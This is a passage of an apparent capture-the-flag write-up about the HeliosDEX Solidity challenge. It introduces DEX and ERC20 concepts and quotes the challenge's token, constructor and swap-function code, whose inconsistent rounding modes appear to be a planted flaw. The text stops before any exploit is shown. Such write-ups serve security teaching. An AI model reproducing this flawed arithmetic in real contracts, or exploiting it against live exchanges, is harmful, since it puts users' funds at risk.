+<h3 id="heliosdexsol">HeliosDEX.sol</h3>
+<p>Before diving in the code, we must know what a DEX and ERC20 are.</p>
+<h4 id="definitions">Definitions</h4>
+<h5 id="dex-in-a-nutshell">DEX in a nutshell</h5>
+<p>To sum up, a DEX is a platform with smart contracts working on the backend that provides an automated way to swap a token for one another. (example : ETH for ELD, the token created for this challenge).</p>
+<p><img src="https://static.cryptobriefing.com/wp-content/uploads/2020/10/02092618/uniswap-interface-587x440.png" alt="uniswap interface" title="cryptobriefing.com">.</p>
+<p>So we can transfer ethers and get a certain amount of tokens, paying micro fees for each transaction.</p>
+<h5 id="erc20-in-a-nutshell">ERC20 in a nutshell</h5>
+<p><code>ERC20</code> is a standard defining &ldquo;Fongible Token&rdquo; (FT) in the ethereum network.</p>
+<p>Example functionalities ERC-20 provides:</p>
+<ul>
+<li>
+<p>transfer tokens from one account to another</p>
+</li>
+<li>
+<p>get the current token balance of an account</p>
+</li>
+<li>
+<p>get the total supply of the token available on the network</p>
+</li>
+<li>
+<p>approve whether an amount of token from an account can be spent by a third-party account</p>
+</li>
+</ul>
+<p>source : <a href="https://ethereum.org/en/developers/docs/standards/tokens/erc-20/">ethereum dev docs</a></p>
+<blockquote>
+<p>The difference with the well-knowns &ldquo;NFT&rdquo; (ERC-721), is that NFTs or Non-Fongible Tokens cannot be replaced with another identical token, while a Fongible-Tokens can be replaced. For instance you can replace a &ldquo;ELD&rdquo; token with another identical &ldquo;ELD&rdquo; token.</p>
+</blockquote>
+<p>The public functions defined for ERC20 tokens are the following :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">9
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">name</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">string</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">symbol</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">string</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">decimals</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">uint8</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">totalSupply</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">uint256</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">balanceOf</span>(<span style="color:#dbbc7f">address</span> _owner) <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">uint256</span> <span style="color:#d699b6">balance</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">transfer</span>(<span style="color:#dbbc7f">address</span> _to, <span style="color:#dbbc7f">uint256</span> _value) <span style="color:#e67e80">public</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span> success)
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">transferFrom</span>(<span style="color:#dbbc7f">address</span> _from, <span style="color:#dbbc7f">address</span> _to, <span style="color:#dbbc7f">uint256</span> _value) <span style="color:#e67e80">public</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span> success)
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">approve</span>(<span style="color:#dbbc7f">address</span> _spender, <span style="color:#dbbc7f">uint256</span> _value) <span style="color:#e67e80">public</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span> success)
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">allowance</span>(<span style="color:#dbbc7f">address</span> _owner, <span style="color:#dbbc7f">address</span> _spender) <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">uint256</span> remaining)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>These functions are documented in the <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20">openzeppelin documentation</a>.</p>
+<p>An address have its token balance in the <code>balanceOf[account]</code> mapping on a token.</p>
+<p>There is another mapping, <code>allowance[account][spender]</code>, which stores the token amount from an account, a third-party account is allowed to spend.</p>
+<h4 id="the-contract">The contract</h4>
+<h5 id="constructors">Constructors</h5>
+<p>3 Tokens are created following the ERC20 standard, &ldquo;ELD&rdquo;, &ldquo;MAL&rdquo; and &ldquo;HLS&rdquo;.</p>
+<p>The contracts are named <code>EldorionFang</code>,  <code>MalakarEssence</code> and <code>HeliosLuminaShards</code> :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;@openzeppelin/contracts/utils/math/Math.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> EldorionFang <span style="color:#e67e80">is</span> ERC20 {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">uint256</span> initialSupply) ERC20(<span style="color:#b2c98f">&#34;EldorionFang&#34;</span>, <span style="color:#b2c98f">&#34;ELD&#34;</span>) {
+</span></span><span style="display:flex;"><span>        _mint(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, initialSupply);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> MalakarEssence <span style="color:#e67e80">is</span> ERC20 {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">uint256</span> initialSupply) ERC20(<span style="color:#b2c98f">&#34;MalakarEssence&#34;</span>, <span style="color:#b2c98f">&#34;MAL&#34;</span>) {
+</span></span><span style="display:flex;"><span>        _mint(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, initialSupply);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> HeliosLuminaShards <span style="color:#e67e80">is</span> ERC20 {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">uint256</span> initialSupply) ERC20(<span style="color:#b2c98f">&#34;HeliosLuminaShards&#34;</span>, <span style="color:#b2c98f">&#34;HLS&#34;</span>) {
+</span></span><span style="display:flex;"><span>        _mint(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, initialSupply);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And their constructor tells that their initial supply (the total number of tokens for each) is defined with a variable.</p>
+<p>Let&rsquo;s look at the HeliosDEX contract constructor :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">uint256</span> initialSupplies) <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>    eldorionFang <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> EldorionFang(initialSupplies);
+</span></span><span style="display:flex;"><span>    malakarEssence <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> MalakarEssence(initialSupplies);
+</span></span><span style="display:flex;"><span>    heliosLuminaShards <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> HeliosLuminaShards(initialSupplies);
+</span></span><span style="display:flex;"><span>    reserveELD <span style="color:#7a8478">=</span> initialSupplies;
+</span></span><span style="display:flex;"><span>    reserveMAL <span style="color:#7a8478">=</span> initialSupplies;
+</span></span><span style="display:flex;"><span>    reserveHLS <span style="color:#7a8478">=</span> initialSupplies;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The three tokens share the same amount of initial supply which is defined by the variable <code>initialSupplies</code> passed to the <code>HeliosDEX</code> constructor.</p>
+<p>The latter is deployed by the setup contract, which set an initial supply of <code>1000</code> tokens :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>TARGET <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> HeliosDEX{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">1000</span> <span style="color:#e67e80">ether</span>}(<span style="color:#d699b6">1000</span>);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="swap-functions">swap functions</h5>
+<p>There are three swap functions for each token.</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">swap functions</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">39
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">swapForELD</span>() <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> underHeliosEye {
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> grossELD <span style="color:#7a8478">=</span> Math.mulDiv(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, exchangeRatioELD, <span style="color:#d699b6">1</span>e18, Math.Rounding(<span style="color:#d699b6">0</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> fee <span style="color:#7a8478">=</span> (grossELD <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10</span>_000;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> netELD <span style="color:#7a8478">=</span> grossELD <span style="color:#7a8478">-</span> fee;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(netELD <span style="color:#7a8478">&lt;=</span> reserveELD, <span style="color:#b2c98f">&#34;HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    reserveELD <span style="color:#7a8478">-=</span> netELD;
+</span></span><span style="display:flex;"><span>    eldorionFang.<span style="color:#d699b6">transfer</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, netELD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    emit HeliosBarter(<span style="color:#dbbc7f">address</span>(eldorionFang), <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, netELD);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">swapForMAL</span>() <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> underHeliosEye {
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> grossMal <span style="color:#7a8478">=</span> Math.mulDiv(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, exchangeRatioMAL, <span style="color:#d699b6">1</span>e18, Math.Rounding(<span style="color:#d699b6">1</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> fee <span style="color:#7a8478">=</span> (grossMal <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10</span>_000;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> netMal <span style="color:#7a8478">=</span> grossMal <span style="color:#7a8478">-</span> fee;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(netMal <span style="color:#7a8478">&lt;=</span> reserveMAL, <span style="color:#b2c98f">&#34;HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    reserveMAL <span style="color:#7a8478">-=</span> netMal;
+</span></span><span style="display:flex;"><span>    malakarEssence.<span style="color:#d699b6">transfer</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, netMal);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    emit HeliosBarter(<span style="color:#dbbc7f">address</span>(malakarEssence), <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, netMal);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">swapForHLS</span>() <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> underHeliosEye {
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> grossHLS <span style="color:#7a8478">=</span> Math.mulDiv(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, exchangeRatioHLS, <span style="color:#d699b6">1</span>e18, Math.Rounding(<span style="color:#d699b6">3</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> fee <span style="color:#7a8478">=</span> (grossHLS <span style="color:#7a8478">*</span> feeBps) <span style="color:#7a8478">/</span> <span style="color:#d699b6">10</span>_000;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> netHLS <span style="color:#7a8478">=</span> grossHLS <span style="color:#7a8478">-</span> fee;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(netHLS <span style="color:#7a8478">&lt;=</span> reserveHLS, <span style="color:#b2c98f">&#34;HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome&#34;</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    reserveHLS <span style="color:#7a8478">-=</span> netHLS;
+</span></span><span style="display:flex;"><span>    heliosLuminaShards.<span style="color:#d699b6">transfer</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, netHLS);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    emit HeliosBarter(<span style="color:#dbbc7f">address</span>(heliosLuminaShards), <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, netHLS);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>Each function has the modifier <code>underHeliosEye</code> which we&rsquo;ll see later, and they have the same process, only some variables differ.</p>
+<p>Let&rsquo;s take the first one, <code>swapForELD()</code> :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#dbbc7f">uint256</span> grossELD <span style="color:#7a8478">=</span> Math.mulDiv(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>, exchangeRatioELD, <span style="color:#d699b6">1</span>e18, Math.Rounding(<span style="color:#d699b6">0</span>));
